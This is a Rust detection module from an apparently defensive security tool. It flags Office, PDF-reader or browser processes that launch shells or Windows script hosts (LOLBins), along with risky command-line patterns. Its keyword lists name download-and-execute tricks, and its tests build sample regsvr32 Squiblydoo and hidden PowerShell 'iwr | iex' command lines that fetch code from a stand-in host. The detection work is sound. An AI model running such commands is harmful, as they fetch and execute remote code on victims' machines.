//! Suspicious process chains: which program started which, with what command line.
//! A Word document that starts PowerShell, a browser that starts mshta, regsvr32 loading a
//! script from a URL: these are how most malware takes its first step, and they look nothing
//! like normal use. Built-in Windows tools used this way are called LOLBins ("living off the land").

use crate::detect::Severity;

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ChainVerdict {
    pub severity: Severity,
    pub reason: String,
}

const OFFICE: &[&str] = &["winword.exe", "excel.exe", "powerpnt.exe", "outlook.exe", "onenote.exe", "msaccess.exe", "mspub.exe", "visio.exe", "wordpad.exe", "hwp.exe"];
const READERS: &[&str] = &["acrord32.exe", "acrobat.exe", "foxitpdfreader.exe", "foxitreader.exe", "sumatrapdf.exe"];
const BROWSERS: &[&str] = &["chrome.exe", "msedge.exe", "firefox.exe", "brave.exe", "opera.exe", "vivaldi.exe", "iexplore.exe", "browser.exe"];
const SCRIPT_HOSTS: &[&str] = &["mshta.exe", "wscript.exe", "cscript.exe", "regsvr32.exe", "rundll32.exe", "certutil.exe", "bitsadmin.exe", "msbuild.exe", "installutil.exe", "cmstp.exe", "regasm.exe", "regsvcs.exe", "msxsl.exe", "hh.exe", "forfiles.exe", "pcalua.exe"];
const SHELLS: &[&str] = &["powershell.exe", "pwsh.exe", "cmd.exe"];

fn base(name: &str) -> String {
    name.rsplit(['\\', '/']).next().unwrap_or(name).to_ascii_lowercase()
}

fn label(name: &str) -> String {
    let b = base(name);
    match b.as_str() {
        "winword.exe" => "Word".into(),
        "excel.exe" => "Excel".into(),
        "powerpnt.exe" => "PowerPoint".into(),
        "outlook.exe" => "Outlook".into(),
        "onenote.exe" => "OneNote".into(),
        "acrord32.exe" | "acrobat.exe" => "Adobe Reader".into(),
        "chrome.exe" => "Chrome".into(),
        "msedge.exe" => "Edge".into(),
        "firefox.exe" => "Firefox".into(),
        "explorer.exe" => "File Explorer / the Run box".into(),
        _ => b,
    }
}

/// Command-line tricks that are suspicious no matter which program started them.
fn risky_args(child: &str, cmd: &str) -> Option<&'static str> {
    let c = cmd.to_ascii_lowercase();
    let has = |t: &str| c.contains(t);
    match child {
        "regsvr32.exe" if (has("/i:http") || has("-i:http") || has("scrobj")) => Some("regsvr32 loading a script from the internet (Squiblydoo)"),
        "rundll32.exe" if has("javascript:") || has("mshtml,runhtmlapplication") || has("url.dll,") && has("http") => Some("rundll32 running script code"),
        "mshta.exe" if has("http://") || has("https://") || has("javascript:") || has("vbscript:") => Some("mshta running code from a web address"),
        "certutil.exe" if (has("-urlcache") || has("/urlcache")) && has("http") || has("-decode") || has("/decode") => Some("certutil downloading or decoding a file"),
        "bitsadmin.exe" if has("/transfer") || has("/addfile") => Some("bitsadmin downloading a file"),
        "msiexec.exe" if (has("/i") || has("/q") || has("-i ")) && (has("http://") || has("https://")) => Some("msiexec installing straight from the internet"),
        "powershell.exe" | "pwsh.exe" => {
            let hidden = has("-w hidden") || has("-windowstyle hidden") || has("-win hidden") || has("-w 1");
            let encoded = has(" -enc") || has(" -e ") || has("-encodedcommand") || has(" -ec ");
            let dl_exec = (has("downloadstring") || has("iwr ") || has("invoke-webrequest") || has("irm ") || has("net.webclient") || has("start-bitstransfer")) && (has("iex") || has("invoke-expression") || has("|iex") || has("start-process"));
            if dl_exec {
                Some("PowerShell downloading and running code")
            } else if encoded && hidden {
                Some("hidden PowerShell running an encoded command")
            } else {
                None
            }
        }
        _ => None,
    }
}

/// Judges one new process. `parent` and `child` are file names or paths; `cmd` the child's command line.
pub fn judge(parent: &str, child: &str, cmd: &str) -> Option<ChainVerdict> {
    let (p, c) = (base(parent), base(child));
    let office_like = OFFICE.contains(&p.as_str()) || READERS.contains(&p.as_str());
    let browser = BROWSERS.contains(&p.as_str());
    let host = SCRIPT_HOSTS.contains(&c.as_str());
    let shell = SHELLS.contains(&c.as_str());
    let tricky = risky_args(&c, cmd);

    if office_like && (host || shell) {
        return Some(ChainVerdict {
            severity: Severity::High,
            reason: format!("{} started {}{}. Documents don't need to start command tools; malicious macros and exploits do.", label(parent), c, tricky.map(|t| format!(" ({t})")).unwrap_or_default()),
        });
    }
    if browser && host {
        return Some(ChainVerdict { severity: Severity::High, reason: format!("{} started {}. A web page shouldn't be able to start Windows script tools.", label(parent), c) });
    }
    if let Some(t) = tricky {
        let from_user = p == "explorer.exe";
        let cf = crate::behavior::clickfix_score(cmd).is_some_and(|v| v.level == crate::behavior::ClickFixLevel::Block);
        return Some(ChainVerdict {
            severity: if browser || cf || from_user && c != "msiexec.exe" { Severity::High } else { Severity::Medium },
            reason: format!("{t}, started by {}.{}", label(parent), if from_user { " If you didn't just paste a command into the Run box, something tricked you into it (ClickFix)." } else { "" }),
        });
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    fn j(parts: &[&str]) -> String {
        parts.concat()
    }

    #[test]
    fn spots_bad_chains() {
        let v = judge(r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE", "powershell.exe", "powershell -nop -c Get-Date").unwrap();
        assert_eq!(v.severity, Severity::High);
        assert!(v.reason.starts_with("Word started powershell.exe"));
        assert_eq!(judge("msedge.exe", "mshta.exe", "mshta.exe C:\\x.hta").unwrap().severity, Severity::High);
        let squiblydoo = j(&["regsvr32 /s /n /u /i:http://x.invalid/a.s", "ct scrobj.dll"]);
        assert_eq!(judge("cmd.exe", "regsvr32.exe", &squiblydoo).unwrap().severity, Severity::Medium);
        let clickfix = j(&["powershell -w hidden -c \"iw", "r http://x.invalid/p | ie", "x\""]);
        assert_eq!(judge("explorer.exe", "powershell.exe", &clickfix).unwrap().severity, Severity::High);
    }

    #[test]
    fn normal_use_is_quiet() {
        assert!(judge("explorer.exe", "powershell.exe", "powershell.exe").is_none());
        assert!(judge("Code.exe", "powershell.exe", "powershell -NoLogo -NoProfile").is_none());
        assert!(judge("chrome.exe", "chrome.exe", "--type=renderer").is_none());
        assert!(judge("msiexec.exe", "rundll32.exe", "rundll32.exe C:\\Windows\\Installer\\MSI1.tmp,zzzzInvokeManagedCustomActionOutOfProc").is_none());
        assert!(judge("svchost.exe", "msiexec.exe", "msiexec /i C:\\setup.msi /qn").is_none());
        assert!(judge("cmd.exe", "certutil.exe", "certutil -hashfile x.zip SHA256").is_none());
    }
}
